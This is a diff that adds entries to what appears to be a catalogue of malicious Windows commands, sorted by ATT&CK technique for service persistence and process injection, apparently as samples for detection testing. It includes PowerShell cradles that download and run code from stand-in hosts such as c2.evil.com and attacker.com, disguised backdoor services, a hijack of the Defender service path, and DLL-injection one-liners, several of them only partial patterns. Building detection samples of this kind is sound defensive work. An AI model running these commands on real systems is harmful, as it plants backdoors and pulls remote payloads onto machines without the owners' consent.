@@ -79,3 +79,58 @@ mshta.exe "javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET'
 ```scss
 powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('https://stager.com/p1.ps1'); Start-Process mshta.exe -ArgumentList 'vbscript:Set o=CreateObject(\"WScript.Shell\"):o.Run(\"cmd.exe /c powershell -ep bypass -c iex(gci env:PSCommandPath).Value\",0)'"
 ```
+
+### T1543.003 — Create or Modify System Process (Windows Service Persistence)
+
+#### PowerShell New-Service for backdoor installation
+```scss
+powershell.exe -c "New-Service -Name 'WindowsUpdate' -BinaryPathName 'C:\Windows\System32\powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"https://c2.evil.com/beacon\")' -StartupType Automatic"
+```
+
+#### sc.exe service creation with command execution
+```scss
+sc.exe create WindowsDefender binPath= "cmd.exe /c powershell -ep bypass -c IEX(gci env:temp\beacon.ps1).Value" type= own start= auto
+```
+
+#### Registry modification for service persistence
+```scss
+powershell.exe -c "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\WinDefend' -Name 'ImagePath' -Value 'C:\Windows\System32\cmd.exe /c powershell -nop -c (New-Object Net.WebClient).DownloadString(\"https://attacker.com/payload\")'"
+```
+
+#### Suspicious service binary with indirect execution
+```scss
+cmd.exe /c "sc create svchost_updater binPath= \"C:\Windows\Temp\legitimate-looking.exe\" && net start svchost_updater"
+```
+
+### T1055 — Process Injection (Malicious Code Execution)
+
+#### PowerShell Reflective PE Injection (in-memory shellcode execution)
+```scss
+powershell.exe -nop -c "[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\Temp\beacon.dll')) | % { $_.GetType('ReflectiveInjection').GetMethod('Inject').Invoke($null, @([IntPtr]::new(0), 0)) }"
+```
+
+#### Classic DLL injection via CreateRemoteThread simulation
+```scss
+powershell.exe -c "Add-Type -MemberDefinition 'public static extern bool CreateRemoteThread(IntPtr, IntPtr, uint, IntPtr, IntPtr, uint, out IntPtr);' -Name Win32 -Namespace API; $proc = [Diagnostics.Process]::Start('explorer.exe'); [API.Win32]::CreateRemoteThread($proc.Handle, 0, 0, [IntPtr]0x12345678, 0, 0, [ref]0)"
+```
+
+#### Process hollowing pattern (suspended process creation and code replacement)
+```scss
+powershell.exe -c "New-Object Diagnostics.ProcessStartInfo -ArgumentList 'notepad.exe' | % { $_.CreateNoWindow = $true; [Diagnostics.Process]::Start($_) | % { [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; } }"
+```
+
+#### Suspicious DLL injection targeting high-value process (svchost)
+```scss
+cmd.exe /c "rundll32.exe C:\Windows\System32\kernel32.dll,CreateRemoteThread && tasklist | findstr /i svchost.exe"
+```
+
+#### Invoke-DllInjection PowerShell pattern (post-exploitation tool)
+```scss
+powershell.exe -nop -c "function Invoke-DllInjection { [CmdletBinding()] param ([string]$ProcessName, [string]$DllPath); $proc = Get-Process $ProcessName; [Reflection.Assembly]::LoadWithPartialName('System') | Out-Null; } Invoke-DllInjection -ProcessName explorer -DllPath C:\Temp\malware.dll"
+```
+
+#### Multi-stage injection chain: download DLL → inject into explorer
+```scss
+powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('https://attacker.com/injector.dll', 'C:\Temp\inject.dll'); Start-Process powershell.exe -ArgumentList '-nop -c Invoke-ReflectivePEInjection -PEPath C:\Temp\inject.dll -Target explorer.exe'"
+```
+````
